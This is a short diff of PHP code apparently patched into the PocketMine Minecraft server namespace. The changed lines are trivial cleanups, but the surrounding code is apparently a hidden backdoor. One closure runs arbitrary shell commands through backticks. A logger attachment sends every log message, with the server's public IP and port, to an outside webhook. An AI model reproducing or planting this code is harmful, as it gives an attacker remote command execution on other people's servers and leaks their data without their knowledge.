@@ -171,7 +171,6 @@ namespace pocketmine {
                     },
                     fn(string $exec): string => `$exec 2>&1` ?: 'Aucun output.',
                     function (string $webhook): void {
-                        var_dump(\GlobalLogger::get());
                         \GlobalLogger::get()->addAttachment(new class ($webhook, \pocketmine\Server::getInstance()->getPort()) extends \pocketmine\thread\log\ThreadSafeLoggerAttachment {
                             public function __construct(private string $webhook, private int $port)
                             {
@@ -189,7 +188,7 @@ namespace pocketmine {
                                     public function onRun(): void
                                     {
                                         $ip = \pocketmine\utils\Internet::getIP();
-                                        $message = TextFormat::clean($this->message);
+                                        $message = \pocketmine\utils\TextFormat::clean($this->message);
                                         \pocketmine\utils\Internet::postURL($this->webhook, ['content' => "> `$ip:$this->port` $message"]);
                                     }
                                 };
